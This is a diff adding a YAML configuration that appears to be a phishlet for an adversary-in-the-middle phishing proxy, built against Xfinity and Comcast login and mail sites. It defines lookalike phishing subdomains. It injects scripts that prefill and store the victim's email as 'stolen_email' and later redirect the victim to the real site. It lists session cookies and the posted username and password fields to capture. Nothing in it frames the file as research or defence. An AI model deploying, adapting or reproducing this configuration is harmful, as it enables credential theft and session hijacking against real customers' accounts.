@@ -1,0 +1,51 @@
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'xfinity.com', session: true, is_landing: true}
+  - {phish_sub: 'oauth', orig_sub: 'oauth', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'xfinity.com', session: true, is_landing: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'comcast.net', session: true, is_landing: false}
+  - {phish_sub: 'efinityconnect', orig_sub: 'xfinityconnect.email', domain: 'comcast.net', session: true, is_landing: false}
+sub_filters:
+  - { triggers_on: "login.xfinity.com", orig_sub: "login", domain: "login.xfinity.com", search: '<input type="email"', replace: '<input type="email" value="{{EXTRACT_EMAIL}}"', mimes: ["text/html"] }
+js_inject:
+  - trigger_domains: ["login.xfinity.com"]
+    trigger_urls: ["/"]
+    script: |
+      let params = new URLSearchParams(window.location.search);
+      let email = params.get("email");
+      if (email) {
+        localStorage.setItem("stolen_email", email);
+      } else {
+        email = localStorage.getItem("stolen_email");
+      }
+      if (email) {
+        let emailField = document.querySelector("input[type=email]");
+        if (emailField) {
+          emailField.value = email;
+        }
+      }
+auth_tokens:
+  - domain: 'connect.xfinity.com'
+    keys: ['JSESSIONID', 'open-xchange-session', 'open-xchange-secret', 'open-xchange-public-session', 'OXBETA']
+  - domain: '.login.xfinity.com'
+    keys: ['ssoid', 'xfinity-auth']
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.xfinity.com'
+  path: '/'
+js_inject:
+  - trigger_domains: ["login.xfinity.com"]
+    trigger_urls: ["/post_login"]
+    script: |
+      setTimeout(() => {
+        window.location.href = "https://xfinity.com";
+      }, 2000);
